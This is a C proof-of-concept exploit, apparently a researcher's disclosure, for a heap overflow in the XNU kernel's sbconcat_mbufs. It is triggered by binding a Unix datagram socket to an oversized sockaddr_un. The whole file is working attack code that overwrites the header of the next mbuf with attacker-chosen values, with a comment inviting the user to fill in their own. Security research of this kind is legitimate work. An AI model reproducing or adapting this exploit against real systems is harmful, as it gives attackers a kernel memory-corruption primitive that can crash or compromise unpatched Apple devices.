// ravi (@0xjprx)
// Overflow in sbconcat_mbufs when CONFIG_MBUF_MCACHE is on.
// The overflow allows us to control the m_hdr of whatever mbuf is
// unfortunate enough to be allocated after us.
// Bug introduced in xnu-10002.1.13.
// gcc exploit.c -o exploit
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mbuf.h>
#include <sys/un.h>
#include <errno.h>

#define SOCKETPAIR_FD    ((1))
#define SIZE_OF_SOCKNAME ((0xFF))
#define FILENAME         "TURPENTINE"

#define OFFSET_MHDR      ((224))

typedef struct m_hdr {
    uint64_t mh_next;
    uint64_t mh_nextpkt;
    uint64_t mh_data;
    uint32_t mh_len;
    uint16_t mh_type;
    uint16_t mh_flags;
} m_hdr;

int main() {
    uint8_t sockaddr_un_buf[SIZE_OF_SOCKNAME+1];
    int rv = 0;
    int socket_vector_fds[2];
    socket_vector_fds[0] = 0;
    socket_vector_fds[1] = 0;

    rv = socketpair(PF_LOCAL, SOCK_DGRAM, 0, (int *)&socket_vector_fds);
    if (-1 == rv) {
        fprintf(stderr, "Error creating socket pair: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }

    memset(sockaddr_un_buf, '\x00', sizeof(sockaddr_un_buf));

    // Fill in with whatever you want the m_hdr of the next mbuf to be :)
    m_hdr *header = (m_hdr *)&sockaddr_un_buf[OFFSET_MHDR];
    header->mh_next    = 0x4040404040404040ULL;
    header->mh_nextpkt = 0x4141414141414141ULL;
    header->mh_data    = 0x4242424242424242ULL;
    header->mh_len     = 0x43434343;
    header->mh_type    = 0x4444;
    header->mh_flags   = 0x4545;

    struct sockaddr_un *socket_name = (struct sockaddr_un *)sockaddr_un_buf;
    socket_name->sun_len = SIZE_OF_SOCKNAME;
    socket_name->sun_family = 0x00;
    strcpy((char *)(socket_name->sun_path), FILENAME);

    rv = bind(socket_vector_fds[SOCKETPAIR_FD], (const struct sockaddr *)socket_name, SIZE_OF_SOCKNAME);
    if (0 != rv) {
        fprintf(stderr, "Error binding: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }

    rv = write(socket_vector_fds[SOCKETPAIR_FD], NULL, 0);
    if (-1 == rv) {
        fprintf(stderr, "Error write: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }

    close(socket_vector_fds[0]);
    close(socket_vector_fds[1]);
    unlink(FILENAME);

    printf("Goodbye :)\n");
    return EXIT_SUCCESS;
}